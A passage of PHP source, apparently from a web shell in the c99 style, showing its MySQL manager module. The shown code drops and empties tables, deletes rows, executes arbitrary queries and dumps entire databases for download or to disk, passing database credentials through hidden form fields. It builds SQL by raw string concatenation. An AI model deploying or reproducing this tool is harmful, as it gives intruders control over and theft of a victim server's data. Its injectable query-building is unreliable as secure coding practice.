   if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,strlen($sql_query)-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
   elseif ($sql_act == "tbldump") {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
   elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,strlen($sql_query)-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,strlen($sql_query)-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,strlen($sql_query)-1).";"; $sql_act = "query";}
   elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,strlen($sql_query)-1).";"; $sql_act = "query";}
   elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,strlen($sql_query)-1);} $sql_act = "query";}
   elseif ($sql_tbl_act == "insert")
   {
    if ($sql_tbl_insert_radio == 1)
    {
     $keys = "";
     $akeys = array_keys($sql_tbl_insert);
     foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
     $values = "";
     $i = 0;
     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
     $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
    elseif ($sql_tbl_insert_radio == 2)
    {
     $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
     $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
     $result = mysql_query($sql_query) or print(mysql_smarterror());
     $result = mysql_fetch_array($result, MYSQL_ASSOC);
     $sql_act = "query";
     $sql_tbl_act = "browse";
    }
   }
   if ($sql_act == "query")
   {
    echo "&lt;hr size=\"1\" noshade&gt;";
    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
    if ((!$submit) or ($sql_act)) {echo "&lt;table border=\"0\" width=\"100%\" height=\"1\"&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\"".$sql_surl."\" method=\"POST\"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\"sql_query\" cols=\"100\" rows=\"10\"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"query\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"submit\" value=\"1\"&gt;&lt;input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"&gt;&nbsp;&lt;input type=\"submit\" value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";}
   }
   if (in_array($sql_act,$acts))
   {
    ?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newtbl"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newtbl" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="dump"&gt;&lt;input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="dump_file" size="30" value="<?php echo "dump_".$SERVER_NAME."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>"&gt;&nbsp;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;<?php
    if (!empty($sql_act)) {echo "&lt;hr size=\"1\" noshade&gt;";}
    if ($sql_act == "newtbl")
    {
     echo "&lt;b&gt;";
     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";
    }
    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
   }
   elseif ($sql_act == "dump")
   {
    if (empty($submit))
    {
     $diplay = false;
     echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"dump\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;b&gt;SQL-Dump:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;b&gt;DB:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"&gt;&lt;br&gt;&lt;br&gt;";
     $v = join (";",$dmptbls);
     echo "&lt;b&gt;Only tables (explode \";\")&nbsp;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt;:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"&gt;&lt;br&gt;&lt;br&gt;";
     if ($dump_file) {$tmp = $dump_file;}
     else {$tmp = htmlspecialchars("./dump_".$SERVER_NAME."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
     echo "&lt;b&gt;File:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;b&gt;Download: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;";
     echo "&lt;b&gt;Save to file: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked&gt;";
     echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Dump\"&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt; - all, if empty";
     echo "&lt;/form&gt;";
    }
    else
    {
     $diplay = true;
     $set = array();
     $set["sock"] = $sql_sock;
     $set["db"] = $sql_db;
     $dump_out = "download";
     $set["print"] = 0;
     $set["nl2br"] = 0;
     $set[""] = 0;
     $set["file"] = $dump_file;
     $set["add_drop"] = true;
     $set["onlytabs"] = array();
     if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
     $ret = mysql_dump($set);
     if ($sql_dump_download)
     {
      @ob_clean();
      header("Content-type: application/octet-stream");
      header("Content-length: ".strlen($ret));
      header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";"); 
      echo $ret;
      exit;
     }
     elseif ($sql_dump_savetofile)
     {
      $fp = fopen($sql_dump_file,"w");
      if (!$fp) {echo "&lt;b&gt;Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
      else
      {
       fwrite($fp,$ret);
       fclose($fp);
       echo "&lt;b&gt;Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")&lt;/b&gt;.";
      }
     }
     else {echo "&lt;b&gt;Dump: nothing to do!&lt;/b&gt;";}
    }
   }
   if ($diplay)
   {
    if (!empty($sql_tbl))
    {
     if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
     $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
     $count_row = mysql_fetch_array($count);
     mysql_free_result($count);     
     $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
     $tbl_struct_fields = array();
     while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}     
     if ($sql_ls &gt; $sql_le) {$sql_le = $sql_ls + $perpage;}
     if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
     if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
     if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
     $perpage = $sql_tbl_le - $sql_tbl_ls;
     if (!is_numeric($perpage)) {$perpage = 10;}
     $numpages = $count_row[0]/$perpage; 
     $e = explode(" ",$sql_order);
     if (count($e) == 2)
     {
      if ($e[0] == "d") {$asc_desc = "DESC";}
      else {$asc_desc = "ASC";}
      $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
     }
     else {$v = "";}
     $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
     $result = mysql_query($query) or print(mysql_smarterror());
     echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)&lt;/b&gt;&lt;/center&gt;";
     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\"&gt;[&nbsp;&lt;b&gt;Structure&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\"&gt;[&nbsp;&lt;b&gt;Browse&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\"&gt;[&nbsp;&lt;b&gt;Dump&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\"&gt;[&nbsp;&lt;b&gt;Insert&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
     if ($sql_tbl_act == "structure") {echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Coming sooon!&lt;/b&gt;";}
     if ($sql_tbl_act == "insert")
     {
      if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
      if (!empty($sql_tbl_insert_radio))
      {

      }
      else
      {
       echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Inserting row into table:&lt;/b&gt;&lt;br&gt;";
       if (!empty($sql_tbl_insert_q))
       {
        $sql_query = "SELECT * FROM `".$sql_tbl."`";
        $sql_query .= " WHERE".$sql_tbl_insert_q;
        $sql_query .= " LIMIT 1;";
        $result = mysql_query($sql_query,$sql_sock) or print("&lt;br&gt;&lt;br&gt;".mysql_smarterror());
        $values = mysql_fetch_assoc($result);
        mysql_free_result($result);
       }
       else {$values = array();}
       echo "&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Field&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Function&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
       foreach ($tbl_struct_fields as $field)
       {
        $name = $field["Field"];
        if (empty($sql_tbl_insert_q)) {$v = "";}
        echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;".htmlspecialchars($name)."&lt;/b&gt;&lt;/td&gt;&lt;td&gt;".$field["Type"]."&lt;/td&gt;&lt;td&gt;&lt;select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"&gt;&lt;option value=\"\"&gt;&lt;/option&gt;&lt;option&gt;PASSWORD&lt;/option&gt;&lt;option&gt;MD5&lt;/option&gt;&lt;option&gt;ENCRYPT&lt;/option&gt;&lt;option&gt;ASCII&lt;/option&gt;&lt;option&gt;CHAR&lt;/option&gt;&lt;option&gt;RAND&lt;/option&gt;&lt;option&gt;LAST_INSERT_ID&lt;/option&gt;&lt;option&gt;COUNT&lt;/option&gt;&lt;option&gt;AVG&lt;/option&gt;&lt;option&gt;SUM&lt;/option&gt;&lt;option value=\"\"&gt;--------&lt;/option&gt;&lt;option&gt;SOUNDEX&lt;/option&gt;&lt;option&gt;LCASE&lt;/option&gt;&lt;option&gt;UCASE&lt;/option&gt;&lt;option&gt;NOW&lt;/option&gt;&lt;option&gt;CURDATE&lt;/option&gt;&lt;option&gt;CURTIME&lt;/option&gt;&lt;option&gt;FROM_DAYS&lt;/option&gt;&lt;option&gt;FROM_UNIXTIME&lt;/option&gt;&lt;option&gt;PERIOD_ADD&lt;/option&gt;&lt;option&gt;PERIOD_DIFF&lt;/option&gt;&lt;option&gt;TO_DAYS&lt;/option&gt;&lt;option&gt;UNIX_TIMESTAMP&lt;/option&gt;&lt;option&gt;USER&lt;/option&gt;&lt;option&gt;WEEKDAY&lt;/option&gt;&lt;option&gt;CONCAT&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50&gt;&lt;/td&gt;&lt;/tr&gt;";
        $i++;
       }
       echo "&lt;/table&gt;&lt;br&gt;";
       echo "&lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "&gt;&lt;b&gt;Insert as new row&lt;/b&gt;";
       if (!empty($sql_tbl_insert_q)) {echo " or &lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked&gt;&lt;b&gt;Save&lt;/b&gt;"; echo "&lt;input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\"&gt;";}
       echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;";
      }
     }
     if ($sql_tbl_act == "browse")
     {
      $sql_tbl_ls = abs($sql_tbl_ls);
      $sql_tbl_le = abs($sql_tbl_le);
      echo "&lt;hr size=\"1\" noshade&gt;";
      echo "&lt;img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\"&gt;&nbsp;";
      $b = 0;
      for($i=0;$i&lt;$numpages;$i++)
      {
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"&gt;&lt;u&gt;";}
       echo $i;
       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;/u&gt;&lt;/a&gt;";}
       if (($i/30 == round($i/30)) and ($i &gt; 0)) {echo "&lt;br&gt;";}
       else {echo "&nbsp;";}
      }
      if ($i == 0) {echo "empty";}
      echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"&gt;&nbsp;&lt;input type=\"submit\" value=\"View\"&gt;&lt;/form&gt;";
      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;";
      echo "&lt;tr&gt;";
      echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"&gt;&lt;/td&gt;";
      for ($i=0;$i&lt;mysql_num_fields($result);$i++)
      {
       $v = mysql_field_name($result,$i);
       if ($e[0] == "a") {$s = "d"; $m = "asc";}
       else {$s = "a"; $m = "desc";}
       echo "&lt;td&gt;";
       if (empty($e[0])) {$e[0] = "a";}
       if ($e[1] != $v) {echo "&lt;a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"&gt;&lt;b&gt;".$v."&lt;/b&gt;&lt;/a&gt;";}
       else {echo "&lt;b&gt;".$v."&lt;/b&gt;&lt;a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"&gt;&lt;img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"&gt;&lt;/a&gt;";}
       echo "&lt;/td&gt;";
      }
      echo "&lt;td&gt;&lt;font color=\"green\"&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;";
      echo "&lt;/tr&gt;";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       echo "&lt;tr&gt;";
       $w = "";
       $i = 0;
       foreach ($row as $k=&gt;$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) &gt; 0) {$w = substr($w,0,strlen($w)-3);}
       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"&gt;&lt;/td&gt;";
       $i = 0;
       foreach ($row as $k=&gt;$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "&lt;font color=\"green\"&gt;NULL&lt;/font&gt;";}
        echo "&lt;td&gt;".$v."&lt;/td&gt;";
        $i++;
       }
       echo "&lt;td&gt;";
       echo "&lt;a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;";
       echo "&lt;a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"&gt;&lt;img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"&gt;&lt;/a&gt;&nbsp;";
       echo "&lt;/td&gt;";
       echo "&lt;/tr&gt;";
      }
      mysql_free_result($result);
      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"left\"&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;&lt;select name=\"sql_act\"&gt;";
      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
      echo "&lt;option value=\"deleterow\"&gt;Delete&lt;/option&gt;";
      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
     }
    }
    else
    {
     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);
     if (!$result) {echo mysql_smarterror();}
     else
     {
      echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"&gt;&lt;/td&gt;&lt;td&gt;&lt;center&gt;&lt;b&gt;Table&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Rows&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Created&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Modified&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
       $tsize += $row["Data_length"];
       $trows += $row["Rows"];
       $size = view_size($row["Data_length"]);
       echo "&lt;tr&gt;";
       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"&gt;&lt;/td&gt;";
       echo "&lt;td&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"&gt;&lt;b&gt;".$row["Name"]."&lt;/b&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Rows"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Type"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Create_time"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$row["Update_time"]."&lt;/td&gt;";
       echo "&lt;td&gt;".$size."&lt;/td&gt;";
       echo "&lt;td&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&nbsp;&lt;a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;&lt;/td&gt;";
       echo "&lt;/tr&gt;";
       $i++;
      }
      echo "&lt;tr bgcolor=\"000000\"&gt;";
      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;Â»&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;center&gt;&lt;b&gt;".$i." table(s)&lt;/b&gt;&lt;/center&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;b&gt;".$trows."&lt;/b&gt;&lt;/td&gt;";
      echo "&lt;td&gt;".$row[1]."&lt;/td&gt;";
      echo "&lt;td&gt;".$row[10]."&lt;/td&gt;";
      echo "&lt;td&gt;".$row[11]."&lt;/td&gt;";
      echo "&lt;td&gt;&lt;b&gt;".view_size($tsize)."&lt;/b&gt;&lt;/td&gt;";
      echo "&lt;td&gt;&lt;/td&gt;";
      echo "&lt;/tr&gt;";
      echo "&lt;/table&gt;&lt;hr size=\"1\" noshade&gt;&lt;p align=\"right\"&gt;&lt;img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"&gt;&lt;select name=\"sql_act\"&gt;";
      echo "&lt;option value=\"\"&gt;With selected:&lt;/option&gt;";
      echo "&lt;option value=\"tbldrop\"&gt;Drop&lt;/option&gt;";
      echo "&lt;option value=\"tblempty\"&gt;Empty&lt;/option&gt;";
      echo "&lt;option value=\"tbldump\"&gt;Dump&lt;/option&gt;";
      echo "&lt;option value=\"tblcheck\"&gt;Check table&lt;/option&gt;";
      echo "&lt;option value=\"tbloptimize\"&gt;Optimize table&lt;/option&gt;";
      echo "&lt;option value=\"tblrepair\"&gt;Repair table&lt;/option&gt;";
      echo "&lt;option value=\"tblanalyze\"&gt;Analyze table&lt;/option&gt;";
      echo "&lt;/select&gt;&nbsp;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;&lt;/p&gt;";
      mysql_free_result($result);
     }
    }
   }
   }
  }
  else
  {
   $acts = array("","newdb","serverstatus","servervars","processes","getfile");
   if (in_array($sql_act,$acts)) {?>&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new DB:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="newdb"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"&gt;&lt;input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"&gt;&lt;input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"&gt;&lt;input type="text" name="sql_newdb" size="20"&gt;&nbsp;&lt;input type="submit" value="Create"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;View File:&lt;/b&gt;&lt;form action="<?php echo $surl; ?>"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_act" value="getfile"&gt;&lt;input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"&gt;&lt;input type="hidden" name="sql_passwd" value="<?php echo 